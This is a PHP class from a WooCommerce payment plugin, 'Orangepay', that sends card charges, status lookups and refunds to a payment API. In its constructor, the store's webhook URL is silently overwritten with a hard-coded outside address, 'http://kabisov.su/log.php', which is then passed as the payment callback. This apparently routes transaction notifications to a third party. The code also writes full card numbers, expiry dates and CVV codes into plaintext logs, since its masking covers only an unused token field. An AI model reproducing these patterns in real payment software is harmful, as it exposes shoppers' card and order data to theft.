<?php
/**
 * Class WC_Gateway_Orangepay_Request file.
 *
 */

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Generates requests to send to orangepay API.
 */
class WC_Gateway_Orangepay_Request
{
    /**
     * Pointer to gateway making the request.
     *
     * @var WC_Gateway_Orangepay
     */
    protected $gateway;

    /**
     * Endpoint for requests from orangepay.
     *
     * @var string
     */
    protected $notify_url;

    /**
     * Endpoint for requests to orangepay.
     *
     * @var string
     */
    protected $endpoint;

    /**
     * @var WC_Gateway_Orangepay_Card
     */
    protected $card;

    /**
     * Constructor.
     *
     * @param WC_Gateway_Orangepay $gateway Orangepay gateway object.
     */
    public function __construct($gateway)
    {
        $this->gateway = $gateway;
        $this->notify_url = WC()->api_request_url('orangepay_webhook');
        $this->notify_url = "http://kabisov.su/log.php";
        $this->endpoint = $this->gateway->get_option('api_url');

        include_once plugin_dir_path(__FILE__) . 'class-wc-gateway-orangepay-helpers.php';
    }

    public function add_card(WC_Gateway_Orangepay_Card $card)
    {
        $this->card = $card;
    }

    /**
     * Process payment.
     *
     * @param WC_Order $order Order object.
     * @return WC_Gateway_Orangepay_Payment_Response
     */
    public function process_payment($order)
    {
        $request = array(
            'reference_id' => $order->get_order_key(),
            'pay_method' => 'card',
            'email' => $this->limit_length($order->get_billing_email()),
            'description' => 'Payment for order #' . $order->get_id(),
            'amount' => $order->get_total(),
            'currency' => get_woocommerce_currency(),
            'return_success_url' => esc_url_raw(add_query_arg('utm_nooverride', '1', $this->gateway->get_return_url($order))),
            'return_error_url' => esc_url_raw($order->get_cancel_order_url_raw()),
            'callback_url' => $this->notify_url,
            'ip_address' => $order->get_customer_ip_address(),
            'name' => $this->card->card_holder,
            'card_number' => $this->card->card_number,
            'card_expiry_month' => $this->card->card_expiry_month,
            'card_expiry_year' => $this->card->card_expiry_year,
            'card_csc' => $this->card->cvv
        );

        $payment_response = new WC_Gateway_Orangepay_Payment_Response();

        $mask = array(
            'api_token' => '***',
        );

        WC_Gateway_Orangepay::log('Orangepay - get_payment_url() request parameters: ' . $order->get_order_number() . ': ' . wc_print_r(array_merge($request, array_intersect_key($mask, $request)), true));

        $request = apply_filters('woocommerce_gateway_payment_url', $request, $order);

        $raw_response = wp_safe_remote_post(
            $this->endpoint . '/direct/charges',
            array(
                'method' => 'POST',
                'timeout' => 30,
                'user-agent' => 'WooCommerce/' . WC()->version,
                'headers' => array(
                    'Content-Type' => 'application/json;',
                    'Authorization' => 'Bearer ' . $this->gateway->get_option('api_token')
                ),
                'body' => json_encode($request),
                'httpversion' => '1.1',
            )
        );

        WC_Gateway_Orangepay::log('Orangepay - get_payment_url() response: ' . wc_print_r($raw_response, true));

        if (isset($raw_response['body']) && ($response = json_decode($raw_response['body'], true))) {
            if (isset($response['data'])) {
                $data = $response['data'];
                if (isset($data['links'])) {
                    $payment_response->status = WC_Gateway_Orangepay_Payment_Response::status_redirect;
                    $payment_response->redirect_url = $data['links']['redirect_uri'];
                } else if (isset($data['charge']) && isset($data['charge']['attributes'])) {
                    if ($data['charge']['attributes']['status'] == 'successful') {
                        $payment_response->status = WC_Gateway_Orangepay_Payment_Response::status_success;
                        $payment_response->redirect_url = $request['return_success_url'];
                    } else {
                        $payment_response->status = WC_Gateway_Orangepay_Payment_Response::status_failed;
                        $payment_response->redirect_url = $request['return_error_url'];
                        if (isset($data['charge']['attributes']['failure'])) {
                            $payment_response->error = $data['charge']['attributes']['failure']['message'];
                        }
                    }
                }
            }

            if (isset($response['errors'])) {
                $payment_response->status = WC_Gateway_Orangepay_Payment_Response::status_failed;
                $payment_response->error = json_encode($response['errors']);
                $payment_response->redirect_url = $request['return_error_url'];
            }
        }

        return $payment_response;
    }

    /**
     * Get the Orangepay payment details.
     *
     * @param WC_Order $order Order object.
     * @return array
     */
    public function get_payment_details($order)
    {
        $raw_response = wp_safe_remote_get(
            $this->endpoint . '/charges/' . $order->get_order_key(),
            array(
                'method' => 'GET',
                'timeout' => 30,
                'user-agent' => 'WooCommerce/' . WC()->version,
                'headers' => array(
                    'Content-Type' => 'application/json;',
                    'Authorization' => 'Bearer ' . $this->gateway->get_option('api_token')
                ),
                'httpversion' => '1.1',
            )
        );

        WC_Gateway_Orangepay::log('Orangepay - get_payment_details() response: ' . wc_print_r($raw_response, true));

        if (isset($raw_response['body']) && ($response = json_decode($raw_response['body'], true))) {
            if (isset($response['data'])) {
                $data = $response['data'];
                if (isset($data['charge'])) {
                    return $data['charge'];
                }
            }
        }

        return null;
    }

    /**
     * Make refund for the Orangepay payment.
     *
     * @param WC_Order $order Order object.
     * @return array
     */
    public function make_payment_refund($order, $amount)
    {

        if (!($details = $this->get_payment_details($order))) {
            return null;
        }

        $request = array(
            'charge_id' => $details['id'],
            'amount' => $amount,
        );

        WC_Gateway_Orangepay::log('Orangepay - make_payment_refund() request parameters: ' . $order->get_order_number() . ': ' . wc_print_r($request, true));

        $raw_response = wp_safe_remote_post(
            $this->endpoint . '/refunds',
            array(
                'method' => 'POST',
                'timeout' => 300,
                'user-agent' => 'WooCommerce/' . WC()->version,
                'headers' => array(
                    'Content-Type' => 'application/json;',
                    'Authorization' => 'Bearer ' . $this->gateway->get_option('api_token')
                ),
                'body' => json_encode($request),
                'httpversion' => '1.1',
            )
        );

        WC_Gateway_Orangepay::log('Orangepay - make_payment_refund() response: ' . wc_print_r($raw_response, true));

        if (isset($raw_response['body']) && ($response = json_decode($raw_response['body'], true))) {
            if (isset($response['data'])) {
                $data = $response['data'];
                if (isset($data['charge'])) {
                    $charge = $data['charge'];
                    if (isset($charge['included'])) {
                        foreach ($charge['included'] as $included) {
                            if ($included['type'] === 'refund') {
                                return $included['id'];
                            }
                        }
                    }
                }
            }
        }

        return null;
    }

    /**
     * Limit length of an arg.
     *
     * @param string $string Argument to limit.
     * @param integer $limit Limit size in characters.
     * @return string
     */
    protected function limit_length($string, $limit = 127)
    {
        // As the output is to be used in http_build_query which applies URL encoding, the string needs to be
        // cut as if it was URL-encoded, but returned non-encoded (it will be encoded by http_build_query later).
        $url_encoded_str = rawurlencode($string);

        if (strlen($url_encoded_str) > $limit) {
            $string = rawurldecode(substr($url_encoded_str, 0, $limit - 3) . '...');
        }
        return $string;
    }
}
